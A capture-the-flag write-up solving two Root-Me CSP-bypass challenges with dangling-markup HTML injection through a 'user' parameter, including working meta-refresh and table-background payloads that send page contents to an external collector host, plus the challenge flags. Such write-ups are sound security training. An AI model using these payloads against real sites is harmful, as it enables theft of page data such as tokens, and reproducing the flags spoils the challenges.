# CSP Bypass Inline Code

## Dangling markup 1

### Description

Exfiltrate the content of the page!

[Start the challenge](http://challenge01.root-me.org/web-client/ch29/)

### Solution

Injection is possible using `user` parameter in GET request.

![csp-bypass-dangling-markup.png](/assets/ctf/root-me/csp-bypass-dangling-markup.png)

```
connect-src 'none'; font-src 'none'; frame-src 'none'; img-src 'self'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'none'; worker-src 'none'; style-src 'self'; frame-ancestors 'none'; block-all-mixed-content;
```

Looks like all the safety checks are secured.. [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)

![csp-bypass-dangling-markup-1.png](/assets/ctf/root-me/csp-bypass-dangling-markup-1.png)

Looks like it's possible to inject anything inside the `user` field.

![csp-bypass-dangling-markup-2.png](/assets/ctf/root-me/csp-bypass-dangling-markup-2.png)

We can inject anything, but we can't get to execute the Javascript payloads. Because we can inject anything we can make use of html, like [H76: Using meta refresh to create an instant client-side redirect](https://www.w3.org/TR/WCAG20-TECHS/H76.html)

```html
<meta http-equiv="refresh" content="0;URL='https://uwuos.free.beeceptor.com'" />  
```

But this is not enough, as we want contents of the page.

[https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html)

Using payload like following should work, but it's not working in browser.
```html
<meta http-equiv='refresh' content='0;https://uwuos.free.beeceptor.com?
```

> **Note**: You have to play around with quotes

![csp-bypass-dangling-markup-3.png](/assets/ctf/root-me/csp-bypass-dangling-markup-3.png)

But sending URL to bot works...?? [http://challenge01.root-me.org:58029/page?user=%3Cmeta+http-equiv%3D%27refresh%27+content%3D%270%3Bhttps%3A%2F%2Fuwuos.free.beeceptor.com%3F](http://challenge01.root-me.org:58029/page?user=%3Cmeta+http-equiv%3D%27refresh%27+content%3D%270%3Bhttps%3A%2F%2Fuwuos.free.beeceptor.com%3F)

![csp-bypass-dangling-markup-4.png](/assets/ctf/root-me/csp-bypass-dangling-markup-4.png)

> Flag: `D4NGL1NG_M4RKUP_W1TH_FIREF0X_EASY`

## Dangling markup 2

### Description

Exfiltrate the content of the page!

[Start the challenge](http://challenge01.root-me.org/web-client/ch30/)

### Solution

All checks are met again
```
connect-src 'none'; font-src 'none'; frame-src 'none'; manifest-src 'none'; media-src 'none'; object-src 'none'; script-src 'none'; style-src 'self'; worker-src 'none'; frame-ancestors 'none'; block-all-mixed-content;
```

[https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com)

![csp-bypass-dangling-markup-5.png](/assets/ctf/root-me/csp-bypass-dangling-markup-5.png)

Resource: [https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html](https://book.hacktricks.wiki/en/pentesting-web/dangling-markup-html-scriptless-injection/index.html)

Using the [same payload](http://challenge01.root-me.org:58030/page?user=%3Cmeta+http-equiv%3D%27refresh%27+content%3D%270%3Bhttps%3A%2F%2Fuwuos.free.beeceptor.com%3F) as previously doesn't seem to get a callback, payload seems right

![csp-bypass-dangling-markup-6.png](/assets/ctf/root-me/csp-bypass-dangling-markup-6.png)

Following payload worked, not on us (user) but on bot..
```html
<table background='//uwuos.free.beeceptor.com?'
```

[http://challenge01.root-me.org:58030/page?user=<table+background%3D%27%2F%2Fuwuos.free.beeceptor.com%3F](http://challenge01.root-me.org:58030/page?user=<table+background%3D%27%2F%2Fuwuos.free.beeceptor.com%3F)

![csp-bypass-dangling-markup-7.png](/assets/ctf/root-me/csp-bypass-dangling-markup-7.png)

> Flag: `D4NGL1NG_M4RKUP_W1TH_CHR0ME_NO_N3W_LINE`

